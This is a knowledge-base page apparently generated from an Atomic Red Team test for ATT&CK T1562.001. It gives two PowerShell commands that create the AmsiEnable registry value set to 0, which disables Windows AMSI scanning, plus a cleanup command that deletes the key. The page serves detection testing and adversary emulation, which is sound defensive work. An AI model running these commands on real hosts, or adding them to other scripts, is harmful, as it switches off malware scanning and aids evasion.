---
atomic_guid: "728eca7b-0444-4f6f-ac36-437e3d751dc0"
title: "AMSI Bypass - Create AMSIEnable Reg Key"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "728eca7b-0444-4f6f-ac36-437e3d751dc0"
  - "AMSI Bypass - Create AMSIEnable Reg Key"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable” and set its value to 0.
Ref: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses#^t1562001-disable-or-modify-tools|T1562.001: Disable or Modify Tools]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
New-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Name "AmsiEnable" -Value 0 -PropertyType DWORD -Force | Out-Null
```

### Cleanup

```powershell
Remove-Item -Path "HKCU:\Software\Microsoft\Windows Script\Settings" -Recurse -Force 2> $null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
